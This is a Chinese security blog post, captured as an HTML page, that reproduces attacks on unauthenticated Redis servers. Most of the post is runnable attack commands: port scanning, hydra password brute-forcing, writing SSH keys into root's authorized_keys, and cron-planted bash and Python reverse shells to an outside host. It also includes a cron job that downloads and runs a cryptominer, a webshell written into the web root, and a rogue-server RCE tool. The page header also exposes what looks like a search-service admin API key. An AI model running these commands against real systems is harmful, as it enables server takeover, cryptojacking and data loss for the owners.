@@ -1,0 +1,976 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+  
+
+  <title>Redis的一些漏洞复现利用 | Pa55w0rd &#39;s Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 RedisREmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis的一些漏洞复现利用">
+<meta property="og:url" content="http://www.pa55w0rd.online/redis/index.html">
+<meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
+<meta property="og:description" content="0x00 RedisREmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。 Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.pa55w0rd.online/redis/1.png">
+<meta property="article:published_time" content="2019-07-16T02:47:29.000Z">
+<meta property="article:modified_time" content="2019-07-18T05:07:49.424Z">
+<meta property="article:author" content="Pa55w0rd">
+<meta property="article:tag" content="note">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.pa55w0rd.online/redis/1.png">
+
+  
+
+  
+
+
+  
+    <meta name="baidu-site-verification" content="d4d7b60d81cad7436bcab57af5cf84c7" />
+  
+
+
+  
+    <meta name="google-site-verification" content="google4b1aaf5aa71b9f3c.html" />
+  
+
+
+
+  
+    <link rel="alternative" href="/atom.xml" title="Pa55w0rd &#39;s Blog" type="application/atom+xml">
+  
+
+
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!-- <link href="/css/show.ua.css" rel="stylesheet" type="text/css" > -->
+  <link href="http://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  <!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script><![endif]-->
+  <!-- <link href="/vendors/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" /> -->
+
+  <link href="/vendors/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+  <script src="/js/ua-parser.min.js" type="text/javascript"></script>
+  <script src="/js/jquery.js" type="text/javascript"></script>
+  <script src="/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/js/scrollReveal.js" type="text/javascript"></script>
+  <script src="http://cdn.bootcss.com/instantsearch.js/1.5.1/instantsearch.js"></script>
+  <script src="/js/algolia-search.js" type="text/javascript"></script>
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> -->
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+  
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-126660308-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+
+
+
+  
+  
+  <!-- 
+  
+  
+  
+  
+  
+   -->
+
+
+  <script>
+   var CONFIG = {
+    root: '/',
+    algolia: {
+          applicationID: "W1CAX1W2FZ",
+          apiKey: "0a71809a146dcea950631aea9ef44f9c",
+          adminApiKey: "432573b0a0ab3afd374bd04484251a9b",
+          indexName: "Blog",
+          hits: {"per_page":10},
+          labels: {"input_placeholder":"搜索...","hits_empty":"未发现与 「${query}」相关的内容","hits_stats":"${hits} 条相关条目，使用了 ${time} 毫秒"}
+        }
+  };
+  </script>
+<!--
+<script>
+    (function(){
+      if('{{ page.password }}'){
+        if (prompt('请输入文章密码') !== '{{ page.password }}'){
+          alert('密码错误！');
+          history.back();
+        }
+      }
+    })();
+  </script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div data-scroll-reveal="enter top"  id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Pa55w0rd &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">记录</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
+        
+          <a class="main-nav-link" href="/archives"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
+        
+          <a class="main-nav-link" href="/about"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
+        
+          <a class="main-nav-link" href="/comments"><i class="fa fa-comments" aria-hidden="true"></i>留言</a>
+        
+          <a class="main-nav-link" href="/404.html"><i class="fa fa-heart" aria-hidden="true"></i>公益404</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a  class="nav-icon" href="/atom.xml" title="RSS Feed"><i class="fa fa-rss" aria-hidden="true"></i></a>
+        
+        <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a>
+      </nav>
+        <div id="local-search-input"></div>
+      <!-- 百度搜索 -->
+     <!-- <div id="search-form-wrap">
+        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="www.pa55w0rd.online">
+        </form>
+      </div>
+      -->
+   
+    </div>
+  </div>
+</header>
+
+    <div class="outer">
+      <section id="main"><article   id="post-redis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div data-scroll-reveal="enter top and over 0.7s"  class="article-meta">
+    <a  href="/redis/" class="article-date">
+  <i class="fa fa-calendar"></i>
+  <time  datetime="2019-07-16T02:47:29.000Z" itemprop="datePublished">2019-07-16</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/note/">note</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner"  >
+    
+    
+
+      <header class="article-header">
+
+        
+  
+    <h1 class="article-title" itemprop="name">
+      <i class="fa fa-pencil-square-o  article-title-icon"></i>Redis的一些漏洞复现利用
+    </h1>
+  
+
+
+
+      </header>
+    
+    <!-- 目录内容 -->
+
+  <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+        <span class="btn-bg"></span>
+        <span class="btn-text">文章导航</span>
+        </p>
+<div id="toc-article" class="toc-article">
+    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+  <strong class="toc-title">文章目录</strong>
+         <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-Redis"><span class="toc-number">1.</span> <span class="toc-text">0x00 Redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">0x01 未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1 获取主机端口开放信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2 Redis未授权访问获取敏感信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3redis%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用hydra暴力破解redis的密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%86%99ssh-keygen%E5%85%AC%E9%92%A5%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8%E7%A7%81%E9%92%A5%E7%99%BB%E9%99%86"><span class="toc-number">4.</span> <span class="toc-text">0x03 写ssh-keygen公钥然后使用私钥登陆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用计划任务执行命令反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%9C%A8web%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%86%99%E5%85%A5webshell"><span class="toc-number">6.</span> <span class="toc-text">0x05 在web目录下写入webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8redis%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">0x06 利用redis执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-Redis-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84RCE-%E5%A4%8D%E7%8E%B0"><span class="toc-number">8.</span> <span class="toc-text">0x07 Redis 基于主从复制的RCE 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">8.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6getshell"><span class="toc-number">8.2.</span> <span class="toc-text">通过主从复制getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%85%B6%E4%BB%96"><span class="toc-number">9.</span> <span class="toc-text">0x09 其他</span></a></li></ol>
+       </div>
+ <script type="text/javascript">
+function showToc(){
+  var toc_article = document.getElementById("toc-article");
+  var show_toc_btn = document.getElementById("show-toc-btn");
+  toc_article.setAttribute("style","display:block");
+  show_toc_btn.setAttribute("style","display:none");
+  };
+function showBtn(){
+  var toc_article = document.getElementById("toc-article");
+  var show_toc_btn = document.getElementById("show-toc-btn");
+  toc_article.setAttribute("style","display:none");
+  show_toc_btn.setAttribute("style","display:block");
+  };
+ </script>
+    		
+<!-- 目录内容结束 -->
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+        
+          <h2 id="0x00-Redis"><a href="#0x00-Redis" class="headerlink" title="0x00 Redis"></a>0x00 Redis</h2><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
+<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
+<span id="more"></span>
+<h2 id="0x01-未授权访问漏洞"><a href="#0x01-未授权访问漏洞" class="headerlink" title="0x01 未授权访问漏洞"></a>0x01 未授权访问漏洞</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权’访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
+<h3 id="1-获取主机端口开放信息"><a href="#1-获取主机端口开放信息" class="headerlink" title="1 获取主机端口开放信息"></a>1 获取主机端口开放信息</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="keyword">A</span> -p <span class="number">6379</span> --script=redis-info <span class="number">10.240.210.110</span></span><br><span class="line">-<span class="keyword">A</span> 同时打开操作系统指纹和版本检测，等同于-O -sV</span><br></pre></td></tr></table></figure>
+<h3 id="2-Redis未授权访问获取敏感信息"><a href="#2-Redis未授权访问获取敏感信息" class="headerlink" title="2 Redis未授权访问获取敏感信息"></a>2 Redis未授权访问获取敏感信息</h3><p>Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.240.210.110</span><br><span class="line">info <span class="comment"># 可以看到Redis的版本和服务器上内核版本信息，如果是新版的Redis2.8以后的版本还可以看到Redis配置文件的绝对路径</span></span><br><span class="line">keys *  </span><br><span class="line">get key <span class="comment"># 可以查看key和对应的值</span></span><br><span class="line">flushall <span class="comment"># 删除所有数据</span></span><br><span class="line">del key <span class="comment"># 删除键为key的数据</span></span><br><span class="line">CONFIG GET dir <span class="comment"># 获取redis数据目录</span></span><br><span class="line">CONFIG GET dbfilename  <span class="comment"># 获取rdb文件名 ！再修改前先获取，恢复需要</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-利用hydra暴力破解redis的密码"><a href="#0x02-利用hydra暴力破解redis的密码" class="headerlink" title="0x02 利用hydra暴力破解redis的密码"></a>0x02 利用hydra暴力破解redis的密码</h2><p>如果redis设置了密码，且密码轻度低，可通过暴力破解获取密码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hydra</span>  -P <span class="number">500</span>-worst-passwords.txt redis://<span class="number">10.240.210.110</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03-写ssh-keygen公钥然后使用私钥登陆"><a href="#0x03-写ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="0x03 写ssh-keygen公钥然后使用私钥登陆"></a>0x03 写ssh-keygen公钥然后使用私钥登陆</h2><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓存文件authorized.keys,把缓存的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生成一个授权的key。</p>
+<ul>
+<li>Redis服务使用ROOT账号启动</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>
+</ul>
+<ol>
+<li>首先本地生成key<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure></li>
+<li>redis 执行命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCef7YHGr3apU1h+ay+u4ytHeKuSbrgSl/l0D5p5oIZ/tMNtudy+voXzk16MTxaPo0YnwcnBAbIou8toDV2dec01eq6YnRgwASDwQQX5pAzsHA1yhktW46LWQ+4l3RctqYtBnL4azm+3gO49VrcTZbvTNDlsRAXLIcCPvQhNXY+X/8RmNcUMoReBt+uKXApiUOWMp5vADyMnBAmVN2/5QEk7Kbiw0Sd6Ma0GRZ4gMmXinCeMz1jU540DxM9Zqkkjk13sR/A0n7u7wIDyiUlsiNKU09yphMLedjXEcyNIwbFoTAHixxbj6I2CVlSj4AawcaMWRkLd4SA7yvM3S7cWhB root@localhost.localdomain</span></span><br><span class="line"><span class="string">\n\n\n&quot;</span>  <span class="comment"># 使用\n\n换行，避免和redis里面其他缓存数据混合</span></span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></li>
+<li>save保存后可以直接利用私钥登陆ssh<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@10.240.210.110</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-利用计划任务执行命令反弹shell"><a href="#0x04-利用计划任务执行命令反弹shell" class="headerlink" title="0x04 利用计划任务执行命令反弹shell"></a>0x04 利用计划任务执行命令反弹shell</h2>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。</li>
+</ol>
+<p>在redis以root权限运行时可以写crontab来执行命令反弹shell</p>
+<ol>
+<li><p>现在自己服务器上监听一个端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">50000</span></span><br></pre></td></tr></table></figure></li>
+<li><p>连接redis，写入反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.240.210.110:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.240.210.111/50000 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">10.240.210.110:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>python 反弹shell</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="symbol">\&quot;</span>115.28.78.16<span class="symbol">\&quot;</span>,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="symbol">\&quot;</span>/bin/sh<span class="symbol">\&quot;</span>,<span class="symbol">\&quot;</span>-i<span class="symbol">\&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure></li>
+<li><p>1分钟之后服务器接收到反弹的shell</p>
+</li>
+</ol>
+<p>其他比如写入挖矿程序原理和这个是一样的，通过计划任务，到指定网站下载挖矿木马和shell脚本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="number">1</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">PATH=<span class="regexp">/bin:/</span>sbin:<span class="regexp">/usr/</span>bin:<span class="regexp">/usr/</span>sbin:<span class="regexp">/usr/</span>local<span class="regexp">/bin:/u</span>sr<span class="regexp">/local/</span>sbin:~/bin</span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/tmp/watch-smartd&quot;</span> ];</span><br><span class="line">    then</span><br><span class="line">        wget http:<span class="regexp">//</span><span class="number">10.240</span>.<span class="number">210.111</span><span class="regexp">/watch/</span>watch-smartd -O <span class="regexp">/tmp/</span>watch-smartd</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        chmod +x <span class="regexp">/tmp/</span>watch-smartd</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>连接redis，写入计划任务</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span><span class="keyword">var</span><span class="operator">/</span>spool<span class="operator">/</span>cron</span><br><span class="line">config <span class="keyword">set</span> dbfilename root</span><br><span class="line"><span class="keyword">set</span> xxx <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>*/5 * * * * curl http://10.240.210.111/watch/1.sh | sh<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"><span class="keyword">set</span> xxxx <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>*/1 * * * * /tmp/./watch-smartd<span class="subst">\n</span><span class="subst">\n</span><span class="subst">\n</span>&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>1分钟后，在centos的/tmp目录下可以看到挖矿木马watch-smartd,并且具有x权限，使用top命令，可以看到挖矿木马已经执行，占用大量的cpu</p>
+<h2 id="0x05-在web目录下写入webshell"><a href="#0x05-在web目录下写入webshell" class="headerlink" title="0x05 在web目录下写入webshell"></a>0x05 在web目录下写入webshell</h2><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell，用菜刀连接可达到控制服务器的目的。</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.240.210.110:6379</span>&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; set x <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">10.240.210.110:6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-利用redis执行命令"><a href="#0x06-利用redis执行命令" class="headerlink" title="0x06 利用redis执行命令"></a>0x06 利用redis执行命令</h2><p><strong>redis &lt; 2.6</strong> 内置了lua脚本环境，在有连接redis服务器的权限下，可以利用lua执行系统命令。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span>  hello.<span class="keyword">lua</span></span><br><span class="line"></span><br><span class="line">local msg = <span class="string">&quot;hello,hack!&quot;</span></span><br><span class="line"><span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>
+<p>在客户端连接redis服务器并执行hello.lua</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">redis</span>-cli eval <span class="string">&quot;$(cat hello.lua)&quot;</span> <span class="number">0</span> -h <span class="number">10.240.210.110</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-Redis-基于主从复制的RCE-复现"><a href="#0x07-Redis-基于主从复制的RCE-复现" class="headerlink" title="0x07 Redis 基于主从复制的RCE 复现"></a>0x07 Redis 基于主从复制的RCE 复现</h2><p>前面几种通过未授权的redis写文件来完成GetShell的，这种方式的主要问题在于，redis保存的数据并不是简单的json或者是csv，所以写入的文件都会有大量的无用数据，这种主要利用了crontab、ssh key、webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的getshell方式基本就可以说是很通杀了</p>
+<p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Redis 4.x/5.x</strong> </p>
+<h3 id="通过主从复制getshell"><a href="#通过主从复制getshell" class="headerlink" title="通过主从复制getshell"></a>通过主从复制getshell</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>在<strong>Reids 4.x</strong>之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
+<p>通过编写恶意so文件，执行命令</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> redis-rogue-server.py --rhost <span class="number">10.240.210.110</span> --rport <span class="number">6379</span> --lhost <span class="number">10.240.210.111</span> --lport <span class="number">50000</span></span><br></pre></td></tr></table></figure>
+<img src="/redis/1.png" class="" title="描述">
+
+<h2 id="0x09-其他"><a href="#0x09-其他" class="headerlink" title="0x09 其他"></a>0x09 其他</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lifuwei/p/9173782.html">redis中五种数据类型操作命令集锦</a></li>
+<li><a target="_blank" rel="noopener" href="https://redis.io/">Redis 官网</a></li>
+<li><a target="_blank" rel="noopener" href="http://try.redis.io/">Redis 在线测试</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">Redis未授权访问详解 </a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">Redis 基于主从复制的 RCE 利用 POC</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">Redis 基于主从复制的 RCE 利用方式</a></li>
+</ul>
+
+        
+<!--
+        </br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <h2 id="0x00-Redis"><a href="#0x00-Redis" class="headerlink" title="0x00 Redis"></a>0x00 Redis</h2><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
+<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
+<span id="more"></span>
+<h2 id="0x01-未授权访问漏洞"><a href="#0x01-未授权访问漏洞" class="headerlink" title="0x01 未授权访问漏洞"></a>0x01 未授权访问漏洞</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权’访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
